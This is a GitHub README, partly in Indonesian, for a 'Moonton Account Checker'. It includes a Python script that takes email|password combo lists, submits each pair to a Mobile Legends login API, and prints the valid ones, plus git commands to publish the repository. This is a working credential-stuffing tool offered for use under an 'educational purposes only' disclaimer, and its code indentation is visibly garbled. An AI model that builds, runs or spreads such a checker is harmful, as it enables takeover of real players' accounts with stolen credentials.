# -Struktur-Repository-Moonton-Account-Checker-
Berikut isi repositori yang akan Mob buatkan:  📁 moonton-checker/

├── README.md
├── checker.py
└── requirements.txt

# Moonton Account Checker

Simple tool to check login credentials for Mobile Legends (Moonton) accounts.

## Features
- Check email & password combo for login validity.
- Fast & simple CLI interface.

⚠️ For educational purposes only!

## Usage
1. Install dependencies:

pip install -r requirements.txt

2. Run the script:

python checker.py combo.txt

## Combo Format

email@example.com|password123




---

2. checker.py

import requests, sys

def check_account(email, password):
    url = "https://accountmtapi.mobilelegends.com/api/login"
        payload = {
                "email": email,
                        "password": password,
                                "os": "Android"
                                    }
                                        headers = {
                                                "User-Agent": "Mozilla/5.0",
                                                        "Content-Type": "application/x-www-form-urlencoded"
                                                            }

                                                                response = requests.post(url, data=payload, headers=headers)
                                                                    if '"code":0' in response.text:
                                                                            print(f"[VALID] {email} | {password}")
                                                                                else:
                                                                                        print(f"[INVALID] {email} | {password}")

                                                                                        def main():
                                                                                            if len(sys.argv) != 2:
                                                                                                    print("Usage: python checker.py combo.txt")
                                                                                                            return

                                                                                                                with open(sys.argv[1], 'r') as f:
                                                                                                                        lines = f.readlines()

                                                                                                                            for line in lines:
                                                                                                                                    if "|" in line:
                                                                                                                                                email, password = line.strip().split("|")
                                                                                                                                                            check_account(email, password)

                                                                                                                                                            if __name__ == "__main__":
                                                                                                                                                                main()


                                                                                                                                                                ---

                                                                                                                                                                3. requirements.txt

                                                                                                                                                                requests

 pkg install git
 git config --global user.name "namamu"
 git config --global user.email "emailmu"

 git clone https://github.com/USERNAME/moonton-checker.git
 cd moonton-checker

 # Salin file checker.py, README.md, dan requirements.txt ke folder ini

 git add .
 git commit -m "Initial commit"
 git push origin main                                                                                                                                                               